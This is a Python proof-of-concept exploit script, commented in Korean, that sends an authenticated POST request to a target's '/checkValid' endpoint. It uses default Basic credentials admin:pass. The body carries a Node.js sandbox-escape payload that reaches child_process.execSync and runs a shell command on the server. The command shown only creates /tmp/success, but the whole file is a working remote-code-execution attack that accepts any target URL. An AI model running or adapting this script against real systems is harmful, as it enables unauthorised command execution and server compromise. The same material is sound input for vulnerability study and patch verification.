import requests
import sys

# 사용자로부터 입력받은 URL의 인자 개수를 확인
if len(sys.argv) < 2:
    # 사용 방법을 출력
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8081" % (sys.argv[0]))
    sys.exit()  # 인자가 부족할 경우 프로그램 종료

# 사용자로부터 입력받은 URL + 권한 인증을 위한 '/checkValid' 경로 추가
target_url = sys.argv[1] + "/checkValid"

# 실행하고자 하는 임의의 Node.js 코드(touch /tmp/success) 지정
payload = """document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/success")"""

# HTTP 헤더 설정
# 권한 인증을 위해 'Authorization': 'Basic YWRtaW46cGFzcw==' 추가
# Basic -> Base64로 인코딩된 값을 전달
# YWRtaW46cGFzcw== -> admin:pass
headers = {
    'Host': 'your-ip',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
    'Connection': 'close',
    'Authorization': 'Basic YWRtaW46cGFzcw==',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# POST 요청으로 코드 전송
response = requests.post(target_url, data=payload, headers=headers)

# 서버의 응답 출력
print(response.text)
